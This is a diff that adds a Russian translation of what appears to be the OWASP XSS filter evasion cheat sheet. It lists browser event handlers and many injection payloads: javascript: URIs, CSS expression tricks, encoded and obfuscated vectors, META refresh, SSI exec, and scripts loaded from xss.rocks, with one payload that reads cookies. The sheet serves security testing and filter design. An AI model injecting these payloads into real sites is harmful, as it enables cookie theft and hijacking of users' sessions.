+<li><code>onMouseEnter()</code> (курсор перемещается на объект или область)</li>
+<li><code>onMouseLeave()</code> (злоумышленнику нужно заставить пользователя навести мышь на изображение или таблицу, а затем убрать её)</li>
+<li><code>onMouseMove()</code> (злоумышленнику нужно заставить пользователя навести мышь на изображение или таблицу)</li>
+<li><code>onMouseOut()</code> (злоумышленнику нужно заставить пользователя навести мышь на изображение или таблицу, а затем убрать её)</li>
+<li><code>onMouseOver()</code> (курсор перемещается на объект или область)</li>
+<li><code>onMouseUp()</code> (злоумышленнику нужно заставить пользователя кликнуть на изображение)</li>
+<li><code>onMouseWheel()</code> (злоумышленнику нужно заставить пользователя воспользоваться колёсиком мыши)</li>
+<li><code>onMove()</code> (пользователь или злоумышленник перемещает страницу)</li>
+<li><code>onMoveEnd()</code> (пользователь или злоумышленник перемещает страницу)</li>
+<li><code>onMoveStart()</code> (пользователь или злоумышленник перемещает страницу)</li>
+<li><code>onOffline()</code> (срабатывает, если браузер работает в онлайн-режиме и начинает работать офлайн)</li>
+<li><code>onOnline()</code> (срабатывает, если браузер работает в офлайн-режиме и начинает работать онлайн)</li>
+<li><code>onOutOfSync()</code> (прерывает возможность элемента воспроизводить свои медиаданные в соответствии с временно́й шкалой)</li>
+<li><code>onPaste()</code> (пользователю нужно вставить данные или злоумышленник может использовать функцию <code>execCommand("Paste")</code>)</li>
+<li><code>onPause()</code> (событие onpause срабатывает на каждом активном элементе при паузе временно́й шкалы, включая элемент body)</li>
+<li><code>onPopState()</code> (срабатывает при навигации пользователя по истории сессии)</li>
+<li><code>onPropertyChange()</code> (пользователю или злоумышленнику нужно изменить свойство элемента)</li>
+<li><code>onReadyStateChange()</code> (пользователю или злоумышленнику нужно изменить свойство элемента)</li>
+<li><code>onRedo()</code> (пользователь перешёл вперёд в истории отмены действий)</li>
+<li><code>onRepeat()</code> (событие срабатывает один раз при каждом повторении временно́й шкалы, исключая первый полный цикл)</li>
+<li><code>onReset()</code> (пользователь или злоумышленник сбрасывает форму)</li>
+<li><code>onResize()</code> (пользователь изменяет размер окна; злоумышленник может инициализировать это автоматически, например: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li>
+<li><code>onResizeEnd()</code> (пользователь изменяет размер окна; злоумышленник может инициализировать это автоматически, например: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li>
+<li><code>onResizeStart()</code> (пользователь изменяет размер окна; злоумышленник может инициализировать это автоматически, например: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li>
+<li><code>onResume()</code> (событие onresume срабатывает на каждом элементе, становящемся активным при возобновлении временно́й шкалы, включая элемент body)</li>
+<li><code>onReverse()</code> (если элемент имеет repeatCount больше единицы, это событие срабатывает каждый раз при начале обратного воспроизведения временно́й шкалы)</li>
+<li><code>onRowsEnter()</code> (пользователю или злоумышленнику нужно изменить строку в источнике данных)</li>
+<li><code>onRowExit()</code> (пользователю или злоумышленнику нужно изменить строку в источнике данных)</li>
+<li><code>onRowDelete()</code> (пользователю или злоумышленнику нужно удалить строку в источнике данных)</li>
+<li><code>onRowInserted()</code> (пользователю или злоумышленнику нужно вставить строку в источник данных)</li>
+<li><code>onScroll()</code> (пользователю нужно прокрутить страницу или злоумышленник может использовать функцию <code>scrollBy()</code>)</li>
+<li><code>onSeek()</code> (событие <code>onReverse</code> срабатывает при установке воспроизведения временно́й шкалы в любом направлении, кроме прямого)</li>
+<li><code>onSelect()</code> (пользователю нужно выделить текст — злоумышленник может инициализировать это автоматически, например: <code>window.document.execCommand("SelectAll");</code>)</li>
+<li><code>onSelectionChange()</code> (пользователю нужно выделить текст — злоумышленник может инициализировать это автоматически, например: <code>window.document.execCommand("SelectAll");</code>)</li>
+<li><code>onSelectStart()</code> (пользователю нужно выделить текст — злоумышленник может инициализировать это автоматически, например: <code>window.document.execCommand("SelectAll");</code>)</li>
+<li><code>onStart()</code> (срабатывает в начале каждого цикла бегущей строки)</li>
+<li><code>onStop()</code> (пользователю нужно нажать кнопку остановки или покинуть страницу)</li>
+<li><code>onStorage()</code> (область хранения изменилась)</li>
+<li><code>onSyncRestored()</code> (пользователь прерывает возможность элемента воспроизводить свои медиаданные в соответствии с временно́й шкалой)</li>
+<li><code>onSubmit()</code> (злоумышленник или пользователь отправляет форму)</li>
+<li><code>onTimeError()</code> (пользователь или злоумышленник устанавливает свойство времени, например dur, в недопустимое значение)</li>
+<li><code>onTrackChange()</code> (пользователь или злоумышленник меняет трек в плейлисте)</li>
+<li><code>onUndo()</code> (пользователь перешёл назад в истории отмены действий)</li>
+<li><code>onUnload()</code> (когда пользователь кликает по любой ссылке или нажимает кнопку «Назад», или злоумышленник принудительно выполняет клик)</li>
+<li><code>onURLFlip()</code> (это событие срабатывает, когда ASF-файл (Advanced Streaming Format), воспроизводимый медиа-тегом HTML+TIME (Timed Interactive Multimedia Extensions), обрабатывает скриптовые команды, встроенные в ASF-файл)</li>
+<li><code>seekSegmentTime()</code> (это метод, который находит указанную точку на сегментной временно́й шкале элемента и начинает воспроизведение с этой точки. Сегмент состоит из одного повторения временно́й шкалы, включая обратное воспроизведение с атрибутом AUTOREVERSE.)</li>
+</ul>
+<h4 id="bgsound">BGSOUND<a class="headerlink" href="#bgsound" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">BGSOUND</span><span class="w"> </span><span class="nx">SRC</span><span class="o">=</span><span class="s2">&quot;javascript:alert(&#39;XSS&#39;);&quot;</span><span class="o">&gt;</span>
+</code></pre></div>
+<h4 id="javascript-includes">&amp; JavaScript includes<a class="headerlink" href="#javascript-includes" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">BR</span> <span class="na">SIZE</span><span class="o">=</span><span class="s">&quot;&amp;{alert(&#39;XSS&#39;)}&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="style-sheet">STYLE sheet<a class="headerlink" href="#style-sheet" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">LINK</span> <span class="na">REL</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">HREF</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="_7">Удалённая таблица стилей<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<p>Используя нечто столь же простое, как удалённая таблица стилей, можно включить XSS, поскольку параметр style можно переопределить с помощью встроенного выражения. Это работает только в IE. Обратите внимание, что на странице нет ничего, указывающего на наличие встроенного JavaScript. Примечание: во всех примерах с удалёнными таблицами стилей используется тег body, поэтому атака не сработает, если на странице нет никакого содержимого, кроме самого вектора — нужно добавить хотя бы один символ на страницу, если она полностью пустая:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">LINK</span> <span class="na">REL</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://xss.rocks/xss.css&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="2">Удалённая таблица стилей, часть 2<a class="headerlink" href="#2" title="Permanent link">&para;</a></h4>
+<p>Работает так же, как выше, но использует тег <code>&lt;STYLE&gt;</code> вместо тега <code>&lt;LINK&gt;</code>. Незначительная вариация этого вектора была использована для взлома Google Desktop. Как дополнительное замечание: закрывающий тег <code>&lt;/STYLE&gt;</code> можно убрать, если непосредственно после вектора следует HTML-код, который его закроет. Это полезно, если в XSS-атаке нельзя использовать знак равенства или косую черту — такое встречалось в реальных случаях:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">STYLE</span><span class="p">&gt;@</span><span class="k">import</span><span class="s1">&#39;http://xss.rocks/xss.css&#39;</span><span class="p">;&lt;/</span><span class="nt">STYLE</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="3">Удалённая таблица стилей, часть 3<a class="headerlink" href="#3" title="Permanent link">&para;</a></h4>
+<p>Работает только в движках рендеринга Gecko и привязывает XUL-файл к родительской странице.</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">STYLE</span><span class="p">&gt;</span><span class="nt">BODY</span><span class="p">{</span><span class="kp">-moz-</span><span class="n">binding</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;http://xss.rocks/xssmoz.xml#xss&quot;</span><span class="p">)}&lt;/</span><span class="nt">STYLE</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="style-javascript-xss">Теги STYLE, разрывающие JavaScript для XSS<a class="headerlink" href="#style-javascript-xss" title="Permanent link">&para;</a></h3>
+<p>Этот XSS иногда вводит IE в бесконечный цикл алертов:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">STYLE</span><span class="p">&gt;@</span><span class="k">im</span><span class="err">\</span><span class="nt">port</span><span class="s1">&#39;\ja\vasc\ript:alert(&quot;XSS&quot;)&#39;</span><span class="p">;&lt;/</span><span class="nt">STYLE</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="style">Атрибут STYLE, разрывающий выражение<a class="headerlink" href="#style" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">STYLE</span><span class="o">=</span><span class="s">&quot;xss:expr/*XSS*/ession(alert(&#39;XSS&#39;))&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>(Создано Roman Ivanov)</p>
+<h3 id="img-style">IMG STYLE с выражениями<a class="headerlink" href="#img-style" title="Permanent link">&para;</a></h3>
+<p>Это по сути гибрид двух последних XSS-векторов, однако он наглядно показывает, насколько сложно разобрать теги STYLE. Может ввести IE в бесконечный цикл:</p>
+<div class="highlight"><pre><span></span><code>exp/*<span class="p">&lt;</span><span class="nt">A</span> <span class="na">STYLE</span><span class="o">=</span><span class="s">&#39;no\xss:noxss(&quot;*//*&quot;);</span>
+<span class="s">xss:ex/*XSS*//*/*/pression(alert(&quot;XSS&quot;))&#39;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="style-background-image">Тег STYLE с использованием Background-image<a class="headerlink" href="#style-background-image" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">STYLE</span><span class="p">&gt;.</span><span class="nc">XSS</span><span class="p">{</span><span class="k">background-image</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><span class="p">);}&lt;/</span><span class="nt">STYLE</span><span class="p">&gt;&lt;</span><span class="nt">A</span> <span class="na">CLASS</span><span class="o">=</span><span class="s">XSS</span><span class="p">&gt;&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="style-background">Тег STYLE с использованием Background<a class="headerlink" href="#style-background" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">STYLE</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/css&quot;</span><span class="p">&gt;</span><span class="nt">BODY</span><span class="p">{</span><span class="k">background</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><span class="p">)}&lt;/</span><span class="nt">STYLE</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">STYLE</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/css&quot;</span><span class="p">&gt;</span><span class="nt">BODY</span><span class="p">{</span><span class="k">background</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;&lt;javascript:alert&gt;(&#39;XSS&#39;)&quot;</span><span class="p">)}&lt;/</span><span class="nt">STYLE</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="html-style">Анонимный HTML с атрибутом STYLE<a class="headerlink" href="#html-style" title="Permanent link">&para;</a></h3>
+<p>Движку рендеринга IE фактически неважно, существует ли создаваемый HTML-тег, — достаточно, чтобы он начинался с открывающей угловой скобки и буквы:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">XSS</span> <span class="na">STYLE</span><span class="o">=</span><span class="s">&quot;xss:expression(alert(&#39;XSS&#39;))&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="htc-">Локальный htc-файл<a class="headerlink" href="#htc-" title="Permanent link">&para;</a></h3>
+<p>Это немного отличается от двух предыдущих XSS-векторов, поскольку использует .htc-файл, который должен находиться на том же сервере, что и XSS-вектор. Этот пример работает путём подтягивания JavaScript и его выполнения в рамках атрибута style:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">XSS</span> <span class="na">STYLE</span><span class="o">=</span><span class="s">&quot;behavior: url(xss.htc);&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="us-ascii">US-ASCII кодирование<a class="headerlink" href="#us-ascii" title="Permanent link">&para;</a></h3>
+<p>Эта атака использует некорректное ASCII-кодирование с 7 битами вместо 8. Данный XSS-метод может обойти многие контент-фильтры, но работает только если хост передаёт данные в кодировке US-ASCII или если вы задаёте кодировку самостоятельно. Это более полезно для обхода XSS-фильтрации в WAF (Web Application Firewall), чем для обхода серверных фильтров. Apache Tomcat является единственным известным сервером, который по умолчанию всё ещё передаёт данные в кодировке US-ASCII.</p>
+<div class="highlight"><pre><span></span><code><span class="err">¼</span><span class="nx">script</span><span class="err">¾</span><span class="nx">alert</span><span class="p">(</span><span class="err">¢</span><span class="nx">XSS</span><span class="err">¢</span><span class="p">)</span><span class="err">¼</span><span class="o">/</span><span class="nx">script</span><span class="err">¾</span>
+</code></pre></div>
+<h3 id="meta">META<a class="headerlink" href="#meta" title="Permanent link">&para;</a></h3>
+<p>Особенность meta refresh состоит в том, что он не отправляет referrer в заголовке — поэтому его можно использовать для определённых типов атак, когда необходимо скрыть URL источника перехода:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">META</span> <span class="na">HTTP-EQUIV</span><span class="o">=</span><span class="s">&quot;refresh&quot;</span> <span class="na">CONTENT</span><span class="o">=</span><span class="s">&quot;0;url=javascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="meta-data">META с использованием Data<a class="headerlink" href="#meta-data" title="Permanent link">&para;</a></h4>
+<p>Схема URL с директивой data. Этот метод атаки хорош тем, что в нём нет ничего видимого, содержащего слово SCRIPT или JavaScript-директиву, поскольку используется base64-кодирование. Подробнее см. <a href="https://datatracker.ietf.org/doc/html/rfc2397">RFC 2397</a>.</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">META</span> <span class="na">HTTP-EQUIV</span><span class="o">=</span><span class="s">&quot;refresh&quot;</span> <span class="na">CONTENT</span><span class="o">=</span><span class="s">&quot;0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="meta-url">META с дополнительным параметром URL<a class="headerlink" href="#meta-url" title="Permanent link">&para;</a></h4>
+<p>Если целевой сайт пытается проверить, начинается ли URL с <code>&lt;http://&gt;;</code>, можно обойти это правило фильтрации следующим образом:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">META</span> <span class="na">HTTP-EQUIV</span><span class="o">=</span><span class="s">&quot;refresh&quot;</span> <span class="na">CONTENT</span><span class="o">=</span><span class="s">&quot;0; URL=http://;URL=javascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>(Предложено Moritz Naumann)</p>
+<h3 id="iframe">IFRAME<a class="headerlink" href="#iframe" title="Permanent link">&para;</a></h3>
+<p>Если iframe разрешены, возникает и ряд других XSS-проблем:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IFRAME</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">IFRAME</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="iframe_1">IFRAME на основе событий<a class="headerlink" href="#iframe_1" title="Permanent link">&para;</a></h3>
+<p>IFrame и большинство других элементов могут использовать хаос на основе событий, например:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IFRAME</span> <span class="na">SRC</span><span class="o">=</span><span class="s">#</span> <span class="na">onmouseover</span><span class="o">=</span><span class="s">&quot;alert(document.cookie)&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">IFRAME</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>(Предложено: David Cross)</p>
+<h3 id="frame">FRAME<a class="headerlink" href="#frame" title="Permanent link">&para;</a></h3>
+<p>Фреймы имеют те же XSS-проблемы, что и iFrame</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">FRAMESET</span><span class="p">&gt;&lt;</span><span class="nt">FRAME</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">FRAMESET</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="table">TABLE<a class="headerlink" href="#table" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">TABLE</span> <span class="na">BACKGROUND</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="td">TD<a class="headerlink" href="#td" title="Permanent link">&para;</a></h4>
+<p>Аналогично приведённому выше, TD уязвимы к BACKGROUND, содержащим JavaScript XSS-векторы:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">TABLE</span><span class="p">&gt;&lt;</span><span class="nt">TD</span> <span class="na">BACKGROUND</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="div">DIV<a class="headerlink" href="#div" title="Permanent link">&para;</a></h3>
+<h4 id="div-background-image">DIV Background-image<a class="headerlink" href="#div-background-image" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">DIV</span> <span class="na">STYLE</span><span class="o">=</span><span class="s">&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="div-background-image-unicode-xss-">DIV Background-image с Unicode XSS-эксплойтом<a class="headerlink" href="#div-background-image-unicode-xss-" title="Permanent link">&para;</a></h4>
+<p>Этот вариант слегка изменён для обфускации параметра URL:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">DIV</span> <span class="na">STYLE</span><span class="o">=</span><span class="s">&quot;background-image:\0075\0072\006C\0028&#39;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&#39;\0029&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>(Исходная уязвимость была обнаружена Renaud Lifchitz как уязвимость в Hotmail)</p>
+<h4 id="div-background-image_1">DIV Background-image с дополнительными символами<a class="headerlink" href="#div-background-image_1" title="Permanent link">&para;</a></h4>
+<p>RSnake создал быстрый XSS-фаззер для обнаружения ошибочно допустимых символов после открывающей скобки, но перед JavaScript-директивой в IE. Приведены в десятичном формате, но можно использовать шестнадцатеричные с дополнением нулями. (Допустимы любые из следующих символов: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">DIV</span> <span class="na">STYLE</span><span class="o">=</span><span class="s">&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="div-expression">DIV Expression<a class="headerlink" href="#div-expression" title="Permanent link">&para;</a></h4>
+<p>Вариант этой атаки был эффективен против реального XSS-фильтра с использованием перевода строки между двоеточием и <code>expression</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">DIV</span> <span class="na">STYLE</span><span class="o">=</span><span class="s">&quot;width: expression(alert(&#39;XSS&#39;));&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="downlevel">Скрытый блок Downlevel<a class="headerlink" href="#downlevel" title="Permanent link">&para;</a></h3>
+<p>Работает только в движке рендеринга IE — Trident. Некоторые сайты считают всё, что находится внутри блока комментариев, безопасным и не нуждающимся в удалении, что позволяет XSS-вектору существовать. Либо система может пытаться добавлять теги комментариев вокруг чего-либо в тщетной попытке обезвредить это. Как видно, это вряд ли сработает:</p>
+<div class="highlight"><pre><span></span><code><span class="c">&lt;!--</span><span class="p">[</span><span class="k">if</span><span class="w"> </span><span class="nx">gte</span><span class="w"> </span><span class="nx">IE</span><span class="w"> </span><span class="mf">4</span><span class="p">]</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">SCRIPT</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">);</span><span class="o">&lt;</span><span class="err">/SCRIPT&gt;</span>
+<span class="o">&lt;!</span><span class="p">[</span><span class="nx">endif</span><span class="p">]</span><span class="o">--&gt;</span>
+</code></pre></div>
+<h3 id="base">Тег BASE<a class="headerlink" href="#base" title="Permanent link">&para;</a></h3>
+<p>(Работает в IE в безопасном режиме) Эта атака требует <code>//</code> для комментирования последующих символов, чтобы не возникла ошибка JavaScript и XSS-тег отрисовался. Кроме того, атака основывается на том, что многие сайты используют динамически подставляемые пути к изображениям вроде <code>images/image.jpg</code>, а не полные пути. Если путь включает начальную косую черту, например <code>/images/image.jpg</code>, можно убрать один слэш из этого вектора (пока есть два слэша для начала комментария, атака сработает):</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">BASE</span> <span class="na">HREF</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;);//&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="object">Тег OBJECT<a class="headerlink" href="#object" title="Permanent link">&para;</a></h3>
+<p>Если система допускает объекты, можно также внедрять вирусные пейлоады, способные заражать пользователей и т. д. с помощью тега APPLET. Связанный файл — это HTML-файл, который может содержать ваш XSS:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">OBJECT</span> <span class="na">TYPE</span><span class="o">=</span><span class="s">&quot;text/x-scriptlet&quot;</span> <span class="na">DATA</span><span class="o">=</span><span class="s">&quot;http://xss.rocks/scriptlet.html&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">OBJECT</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="embed-svg-xss-">EMBED SVG с XSS-вектором<a class="headerlink" href="#embed-svg-xss-" title="Permanent link">&para;</a></h3>
+<p>Эта атака работает только в Firefox:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">EMBED</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;image/svg+xml&quot;</span> <span class="na">AllowScriptAccess</span><span class="o">=</span><span class="s">&quot;always&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">EMBED</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>(Благодарим nEUrOO за этот пример)</p>
+<h3 id="xml-data-island-cdata">XML Data Island с обфускацией CDATA<a class="headerlink" href="#xml-data-island-cdata" title="Permanent link">&para;</a></h3>
+<p>Эта XSS-атака работает только в IE:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">XML</span> <span class="na">ID</span><span class="o">=</span><span class="s">&quot;xss&quot;</span><span class="p">&gt;&lt;</span><span class="nt">I</span><span class="p">&gt;&lt;</span><span class="nt">B</span><span class="p">&gt;&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;javas&lt;!-- --&gt;cript:alert(&#39;XSS&#39;)&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">B</span><span class="p">&gt;&lt;/</span><span class="nt">I</span><span class="p">&gt;&lt;/</span><span class="nt">XML</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">SPAN</span> <span class="na">DATASRC</span><span class="o">=</span><span class="s">&quot;#xss&quot;</span> <span class="na">DATAFLD</span><span class="o">=</span><span class="s">&quot;B&quot;</span> <span class="na">DATAFORMATAS</span><span class="o">=</span><span class="s">&quot;HTML&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">SPAN</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="xml-javascript-xml-data-island">Локально размещённый XML со встроенным JavaScript, генерируемым с помощью XML data island<a class="headerlink" href="#xml-javascript-xml-data-island" title="Permanent link">&para;</a></h3>
+<p>Эта атака практически идентична приведённой выше, но вместо этого ссылается на локально размещённый (на том же сервере) XML-файл, который содержит ваш XSS-вектор. Результат можно увидеть здесь:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">XML</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;xsstest.xml&quot;</span> <span class="na">ID</span><span class="o">=</span><span class="s">I</span><span class="p">&gt;&lt;/</span><span class="nt">XML</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">SPAN</span> <span class="na">DATASRC</span><span class="o">=</span><span class="s">#I</span> <span class="na">DATAFLD</span><span class="o">=</span><span class="s">C</span> <span class="na">DATAFORMATAS</span><span class="o">=</span><span class="s">HTML</span><span class="p">&gt;&lt;/</span><span class="nt">SPAN</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="htmltime-xml">HTML+TIME в XML<a class="headerlink" href="#htmltime-xml" title="Permanent link">&para;</a></h3>
+<p>Эта атака работает только в IE; помните, что для её работы код должен находиться между тегами HTML и BODY:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">HTML</span><span class="p">&gt;&lt;</span><span class="nt">BODY</span><span class="p">&gt;</span>
+<span class="err">&lt;</span>?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;
+<span class="err">&lt;</span>?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;
+<span class="p">&lt;</span><span class="nt">t:set</span> <span class="na">attributeName</span><span class="o">=</span><span class="s">&quot;innerHTML&quot;</span> <span class="na">to</span><span class="o">=</span><span class="s">&quot;XSS&lt;SCRIPT DEFER&gt;alert(&quot;</span><span class="na">XSS</span><span class="err">&quot;)&lt;/</span><span class="na">SCRIPT</span><span class="p">&gt;</span>&quot;&gt;
+<span class="p">&lt;/</span><span class="nt">BODY</span><span class="p">&gt;&lt;/</span><span class="nt">HTML</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>(Именно так Grey Magic взломал Hotmail и Yahoo!)</p>
+<h3 id="js">При ограничении в несколько символов и фильтрации против <code>.js</code><a class="headerlink" href="#js" title="Permanent link">&para;</a></h3>
+<p>Эта атака позволяет переименовать JavaScript-файл в изображение для использования в качестве XSS-вектора:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;http://xss.rocks/xss.jpg&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="ssi-server-side-includes">SSI (Server Side Includes)<a class="headerlink" href="#ssi-server-side-includes" title="Permanent link">&para;</a></h3>
+<p>Для использования этого XSS-вектора требуется установленный SSI на сервере. Вероятно, нет необходимости упоминать, что если вы можете выполнять команды на сервере, там наверняка есть значительно более серьёзные проблемы:</p>
+<div class="highlight"><pre><span></span><code><span class="c">&lt;!--</span><span class="err">#</span><span class="nx">exec</span><span class="w"> </span><span class="nx">cmd</span><span class="o">=</span><span class="s2">&quot;/bin/echo &#39;&lt;SCR&#39;&quot;</span><span class="o">--&gt;</span><span class="c">&lt;!--</span><span class="err">#</span><span class="nx">exec</span><span class="w"> </span><span class="nx">cmd</span><span class="o">=</span><span class="s2">&quot;/bin/echo &#39;IPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;&#39;&quot;</span><span class="o">--&gt;</span>
+</code></pre></div>
+<h3 id="php">PHP<a class="headerlink" href="#php" title="Permanent link">&para;</a></h3>
+<p>Для этой атаки требуется установленный PHP на сервере. Опять же, если вы можете удалённо выполнять скрипты подобным образом, вероятно, существуют значительно более серьёзные проблемы:</p>
